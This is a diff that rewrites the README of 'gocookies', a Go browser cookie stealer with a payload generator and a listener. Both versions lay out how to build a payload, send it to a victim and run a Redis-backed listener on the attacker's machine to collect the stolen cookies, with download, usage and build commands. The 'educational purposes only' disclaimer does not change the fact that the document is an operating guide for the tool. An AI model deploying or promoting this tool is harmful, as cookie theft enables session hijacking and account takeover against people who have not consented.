@@ -1,78 +1,92 @@
-# gocookies
-**[For educational purposes only]** </br>
-A browser cookie stealer written in Go.</br>
-There are 3 components to this project:
-- gocookies
-- gocookies-generate
-- gocookies-listener
 
-The generator is used to generate a payload that can be sent to the victim. 
-It will steal the cookies from the victim's browser and send them to the listener.
 
-The listener is run on the attacker's machine and will receive the cookies from the victim.
-It stores the received cookies in a Redis database that will be automatically setup within a Docker container.
+# GoCookies - A Browser Cookie Stealer Written in Go
 
-## Pre-requisites
+GoCookies is a tool for stealing cookies from a victim's browser and sending them to an attacker's machine. It is written in Go and has three components: `gocookies`, `gocookies-generate`, and `gocookies-listener`.
+
+The `gocookies-generate` component generates a payload that can be sent to the victim. This payload steals the cookies from the victim's browser and sends them to the `gocookies-listener` component running on the attacker's machine. The `gocookies-listener` component receives the cookies and stores them in a Redis database running in a Docker container.
+
+## Prerequisites
+
+Before using GoCookies, you will need to have the following installed:
+
 - Docker
 - Go
 - Git
 
-## Getting started
-### gocookies-generate
-Clone the repository.
+## Getting Started
+
+To get started with GoCookies, follow these steps:
+
+1. Clone the repository:
+
 ```
 git clone https://github.com/simonfalke-01/gocookies.git
 ```
-Then, download the latest release.
-#### Linux
+
+2. Download the latest release:
+
+For Linux:
 ```
 curl https://github.com/simonfalke-01/gocookies/releases/latest/download/generate-linux -o generate && curl https://github.com/simonfalke-01/gocookies/releases/latest/download/listener-linux -o listener && chmod +x generate listener
 ```
-#### macOS
+
+For macOS:
 ```
 curl https://github.com/simonfalke-01/gocookies/releases/latest/download/generate-macos -o generate && curl https://github.com/simonfalke-01/gocookies/releases/latest/download/listener-macos -o listener && chmod +x generate listener
 ```
-Alternatively, you can go to the [releases](https://github.com/simonfalke-01/gocookies/releases/latest/) page and download the binaries manually.
 
-## Generate payload
-Ensure you have already cloned the repository and downloaded the latest release. If not, see [Getting started](#getting-started). </br>
-The `./generate` command will generate a payload that can be sent to the victim. </br>
-It requires the following arguments:
-- `-h` - The host of the listener
-- `-p` - The port of the listener
-- `-d` - The path of the gocookies directory
-- `-v` (optional) - Whether the payload generated will print verbose output (normally, the payload does not print any output)
+Alternatively, you can download the binaries manually from the [releases](https://github.com/simonfalke-01/gocookies/releases/latest/) page.
+
+## Generating a Payload
+
+To generate a payload, use the `gocookies-generate` component. This component requires the following arguments:
+
+- `-h` - The host of the listener.
+- `-p` - The port of the listener.
+- `-d` - The path of the `gocookies` directory.
+- `-v` (optional) - Whether to print verbose output (by default, the payload does not print any output).
 
 Example:
+
 ```
 ./generate -h localhost -p 8091 -d ~/gocookies/gocookies
 ```
-Where ~/gocookies is the cloned repository. </br>
-Then, you may send the payload to the victim.
 
-## Setup listener
-Ensure you have already cloned the repository and downloaded the latest release. If not, see [Getting started](#getting-started). </br>
-The `./listener` command will setup the listener. </br>
-It requires the following arguments:
-- `-r` - The port which Redis will be running on
-- `-p` - The port which the listener will be running on
+Here, `~/gocookies` is the cloned repository.
+
+Once the payload is generated, you can send it to the victim.
+
+## Setting up the Listener
+
+To set up the listener, use the `gocookies-listener` component. This component requires the following arguments:
+
+- `-r` - The port on which Redis will be running.
+- `-p` - The port on which the listener will be running.
 - `-e` (optional) - Whether to use an existing Redis container (if not specified, a new Redis container will be created). If specified, `-r` will be the port of the existing Redis container.
 
 Example:
+
 ```
 ./listener -r 8090 -p 8091
 ```
-Then, you may wait for the victim to connect to the listener and send the cookies.
 
-## Build from source
-Ensure you have already cloned the repository. If not, see [Getting started](#getting-started). </br>
-### Building gocookies-generate
+Once the listener is set up, you can wait for the victim to connect to it and send the cookies.
+
+## Building from Source
+
+To build `gocookies-generate` from source, navigate to the `gocookies-generate` directory and run:
+
 ```
-cd gocookies-generate
 go build
 ```
-### Building gocookies-listener
+
+To build `gocookies-listener` from source, navigate to the `gocookies-listener` directory and run:
+
 ```
-cd gocookies-listener
 go build
 ```
+
+## Disclaimer
+
+This tool is for educational purposes only. Using this tool without the consent of the victim is illegal and unethical. The author of this tool is not responsible for any illegal or unethical use of this tool.
